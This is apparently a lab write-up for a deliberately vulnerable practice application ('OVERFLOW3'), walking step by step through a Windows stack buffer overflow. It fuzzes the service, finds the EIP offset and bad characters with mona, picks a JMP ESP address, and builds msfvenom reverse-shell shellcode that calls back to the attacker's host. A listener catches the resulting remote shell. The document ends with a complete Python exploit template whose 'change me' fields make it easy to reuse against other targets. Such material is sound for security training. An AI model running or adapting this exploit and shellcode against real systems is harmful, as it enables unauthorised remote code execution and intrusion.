# Buffer Overflow (Task 3)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
TARGET=10.10.23.88
```
```bash
cd exploits
vim fuzzer.py # edit IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.23.88
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[+] Sent: 800 bytes
[+] Sent: 900 bytes
[+] Sent: 1000 bytes
[+] Sent: 1100 bytes
[+] Sent: 1200 bytes
[+] Sent: 1300 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l 1700

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce
```

```bash
vim exploit.py # PAYLOAD: (output above)
```

```bash
!mona findmsp -distance 1700

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 1700
0BADF00D   [+] Looking for cyclic pattern in memory
75280000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       Cyclic pattern (normal) found at 0x018df532 (length 1700 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0037394a (length 1700 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x00374d7a (length 1700 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x35714234 (offset 1274) # <--- LOOK AT THIS
0BADF00D       ESP (0x018dfa30) points at offset 1278 in normal pattern (length 422)
0BADF00D       EBP contains normal pattern : 0x71423371 (offset 1270)
0BADF00D       EBX contains normal pattern : 0x42327142 (offset 1266)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 1700 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x018df38c to 0x018e00d8 (0x00000d4c bytes)
0BADF00D       0x018df534 : Contains normal cyclic pattern at ESP-0x4fc (-1276) : offset 2, length 1698 (-> 0x018dfbd5 : ESP+0x1a6)
0BADF00D   [+] Examining stack (+- 1700 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x018df38c to 0x018e00d8 (0x00000d4c bytes)
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:04.540000
```

```bash
vim exploit.py # OFFSET: 1274, PAYLOAD: "", RETN: "BBBB"
```

```bash
python exploit.py

# output
[*] Attacking: 10.10.23.88
[+] Sent exploit
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
vim exploit.py # PAYLOAD: (output above)
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
python exploit.py

# output
[*] Attacking: 10.10.23.88
[+] Sent exploit.
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 0188fa30

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0188fa30                 Corruption after 16 bytes  00 11 12 40 41 5f 60 b8 b  normal                     Stack
```

```bash
# repeat until Status = Unmodified:
#   start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 0188FA30, "\x00\x11"
# 019CFA30, "\x00\x11\x40"
# 017FFA30, "\x00\x11\x40\x5f"
# 01A4FA30, "\x00\x11\x40\x5f\xb8"
# 0184FA30, "\x00\x11\x40\x5f\xb8\xee"

vim exploit.py # BADCHARS = "\x00\x11\x40\x5f\xb8\xee"
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "???"

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"

           ---------- Mona command started on 2021-08-25 21:02:03 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x11\x40\x5f\xb8\xee"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 2
0BADF00D   [+] Results :
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <-- USING THIS ONE
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
0BADF00D       Found a total of 2 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.421000
```

```bash
vim exploit.py # RETN: "\x03\x12\x50\x62"
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST! Make sure to exclude the bad characters, not the address for your selected JMP instruction!
```bash
ip address
LHOST=10.8.224.177
BADCHARS="\x00\x11\x40\x5f\xb8\xee"
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS

# output
 msfvenom -p windows/shell_reverse_tcp LHOST=10.8.224.177 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1877 bytes
PAYLOAD =  b""
PAYLOAD += b"\xfc\xbb\xe1\xce\x08\xef\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\x1d\x26\x8a\xef\xdd\xb7\xeb\x66\x38\x86\x2b"
PAYLOAD += b"\x1c\x49\xb9\x9b\x56\x1f\x36\x57\x3a\x8b\xcd\x15"
PAYLOAD += b"\x93\xbc\x66\x93\xc5\xf3\x77\x88\x36\x92\xfb\xd3"
PAYLOAD += b"\x6a\x74\xc5\x1b\x7f\x75\x02\x41\x72\x27\xdb\x0d"
PAYLOAD += b"\x21\xd7\x68\x5b\xfa\x5c\x22\x4d\x7a\x81\xf3\x6c"
PAYLOAD += b"\xab\x14\x8f\x36\x6b\x97\x5c\x43\x22\x8f\x81\x6e"
PAYLOAD += b"\xfc\x24\x71\x04\xff\xec\x4b\xe5\xac\xd1\x63\x14"
PAYLOAD += b"\xac\x16\x43\xc7\xdb\x6e\xb7\x7a\xdc\xb5\xc5\xa0"
PAYLOAD += b"\x69\x2d\x6d\x22\xc9\x89\x8f\xe7\x8c\x5a\x83\x4c"
PAYLOAD += b"\xda\x04\x80\x53\x0f\x3f\xbc\xd8\xae\xef\x34\x9a"
PAYLOAD += b"\x94\x2b\x1c\x78\xb4\x6a\xf8\x2f\xc9\x6c\xa3\x90"
PAYLOAD += b"\x6f\xe7\x4e\xc4\x1d\xaa\x06\x29\x2c\x54\xd7\x25"
PAYLOAD += b"\x27\x27\xe5\xea\x93\xaf\x45\x62\x3a\x28\xa9\x59"
PAYLOAD += b"\xfa\xa6\x54\x62\xfb\xef\x92\x36\xab\x87\x33\x37"
PAYLOAD += b"\x20\x57\xbb\xe2\xe7\x07\x13\x5d\x48\xf7\xd3\x0d"
PAYLOAD += b"\x20\x1d\xdc\x72\x50\x1e\x36\x1b\xfb\xe5\xd1\x2e"
PAYLOAD += b"\xf4\x05\x90\x47\x06\xc5\xd2\x2c\x8f\x23\xbe\x42"
PAYLOAD += b"\xc6\xfc\x57\xfa\x43\x76\xc9\x03\x5e\xf3\xc9\x88"
PAYLOAD += b"\x6d\x04\x87\x78\x1b\x16\x70\x89\x56\x44\xd7\x96"
PAYLOAD += b"\x4c\xe0\xbb\x05\x0b\xf0\xb2\x35\x84\xa7\x93\x88"
PAYLOAD += b"\xdd\x2d\x0e\xb2\x77\x53\xd3\x22\xbf\xd7\x08\x97"
PAYLOAD += b"\x3e\xd6\xdd\xa3\x64\xc8\x1b\x2b\x21\xbc\xf3\x7a"
PAYLOAD += b"\xff\x6a\xb2\xd4\xb1\xc4\x6c\x8a\x1b\x80\xe9\xe0"
PAYLOAD += b"\x9b\xd6\xf5\x2c\x6a\x36\x47\x99\x2b\x49\x68\x4d"
PAYLOAD += b"\xbc\x32\x94\xed\x43\xe9\x1c\x0d\xa6\x3b\x69\xa6"
PAYLOAD += b"\x7f\xae\xd0\xab\x7f\x05\x16\xd2\x03\xaf\xe7\x21"
PAYLOAD += b"\x1b\xda\xe2\x6e\x9b\x37\x9f\xff\x4e\x37\x0c\xff"
PAYLOAD += b"\x5a\x37\xb2\xff\x64"
```

```bash
vim exploit.py # PAYLOAD: (output above), PADDING: "\x90" * 16
```

## Send the Exploit
```bash
python exploit.py

# output
[*] Attacking: 10.10.23.88
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.23.88] 49274
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

### Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.23.88" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW3 " # change me; vulnerable function of target
OFFSET = 1274 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\x03\x12\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x11\x40\x5f\xb8\xee" # exclude these from your shellcode
PAYLOAD =  b"" # your shellcode, probably a reverse shell
PAYLOAD += b"\xfc\xbb\xe1\xce\x08\xef\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\x1d\x26\x8a\xef\xdd\xb7\xeb\x66\x38\x86\x2b"
PAYLOAD += b"\x1c\x49\xb9\x9b\x56\x1f\x36\x57\x3a\x8b\xcd\x15"
PAYLOAD += b"\x93\xbc\x66\x93\xc5\xf3\x77\x88\x36\x92\xfb\xd3"
PAYLOAD += b"\x6a\x74\xc5\x1b\x7f\x75\x02\x41\x72\x27\xdb\x0d"
PAYLOAD += b"\x21\xd7\x68\x5b\xfa\x5c\x22\x4d\x7a\x81\xf3\x6c"
PAYLOAD += b"\xab\x14\x8f\x36\x6b\x97\x5c\x43\x22\x8f\x81\x6e"
PAYLOAD += b"\xfc\x24\x71\x04\xff\xec\x4b\xe5\xac\xd1\x63\x14"
PAYLOAD += b"\xac\x16\x43\xc7\xdb\x6e\xb7\x7a\xdc\xb5\xc5\xa0"
PAYLOAD += b"\x69\x2d\x6d\x22\xc9\x89\x8f\xe7\x8c\x5a\x83\x4c"
PAYLOAD += b"\xda\x04\x80\x53\x0f\x3f\xbc\xd8\xae\xef\x34\x9a"
PAYLOAD += b"\x94\x2b\x1c\x78\xb4\x6a\xf8\x2f\xc9\x6c\xa3\x90"
PAYLOAD += b"\x6f\xe7\x4e\xc4\x1d\xaa\x06\x29\x2c\x54\xd7\x25"
PAYLOAD += b"\x27\x27\xe5\xea\x93\xaf\x45\x62\x3a\x28\xa9\x59"
PAYLOAD += b"\xfa\xa6\x54\x62\xfb\xef\x92\x36\xab\x87\x33\x37"
PAYLOAD += b"\x20\x57\xbb\xe2\xe7\x07\x13\x5d\x48\xf7\xd3\x0d"
PAYLOAD += b"\x20\x1d\xdc\x72\x50\x1e\x36\x1b\xfb\xe5\xd1\x2e"
PAYLOAD += b"\xf4\x05\x90\x47\x06\xc5\xd2\x2c\x8f\x23\xbe\x42"
PAYLOAD += b"\xc6\xfc\x57\xfa\x43\x76\xc9\x03\x5e\xf3\xc9\x88"
PAYLOAD += b"\x6d\x04\x87\x78\x1b\x16\x70\x89\x56\x44\xd7\x96"
PAYLOAD += b"\x4c\xe0\xbb\x05\x0b\xf0\xb2\x35\x84\xa7\x93\x88"
PAYLOAD += b"\xdd\x2d\x0e\xb2\x77\x53\xd3\x22\xbf\xd7\x08\x97"
PAYLOAD += b"\x3e\xd6\xdd\xa3\x64\xc8\x1b\x2b\x21\xbc\xf3\x7a"
PAYLOAD += b"\xff\x6a\xb2\xd4\xb1\xc4\x6c\x8a\x1b\x80\xe9\xe0"
PAYLOAD += b"\x9b\xd6\xf5\x2c\x6a\x36\x47\x99\x2b\x49\x68\x4d"
PAYLOAD += b"\xbc\x32\x94\xed\x43\xe9\x1c\x0d\xa6\x3b\x69\xa6"
PAYLOAD += b"\x7f\xae\xd0\xab\x7f\x05\x16\xd2\x03\xaf\xe7\x21"
PAYLOAD += b"\x1b\xda\xe2\x6e\x9b\x37\x9f\xff\x4e\x37\x0c\xff"
PAYLOAD += b"\x5a\x37\xb2\xff\x64"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
